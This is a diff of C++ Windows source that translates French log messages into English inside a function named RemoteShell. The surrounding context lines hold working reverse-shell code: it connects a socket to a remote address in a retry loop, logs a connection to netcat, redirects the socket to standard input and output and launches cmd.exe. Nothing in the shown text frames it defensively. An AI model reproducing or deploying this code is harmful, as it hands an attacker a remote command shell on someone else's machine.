@@ -21,21 +21,21 @@ void RemoteShell()
         SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
 		if(c == INVALID_SOCKET)
 		{
-			LOG << "Impossible d'acquerir un socket pour RemoteShell.";
+			LOG << "Unable to acquire socket for RemoteShell";
 			return;
 		}
         while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
         {
-            LOG << "Connexion a echouee.";
+            LOG << "Connection failed";
             Sleep(100);
         }
-		LOG << "Connecte a netcat.";
+		LOG << "Connected to NetCat";
         si.hStdInput = (HANDLE)c;
         si.hStdOutput = (HANDLE)c;
         si.hStdError = (HANDLE)c;
         if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
 		{
-			LOG << "Impossible de demarrer cmd.exe pour RemoteShell.";
+			LOG << "cmd.exe failed RemoteShell.";
 		}
 		else
 		{
@@ -57,7 +57,7 @@ int main(int argc, char * argv[])
 	}
 	catch(...)
 	{
-		LOG << "Erreur d'origine inconnue.";
+		LOG << "Unknown exception";
 	}
 	return EXIT_SUCCESS;
 }
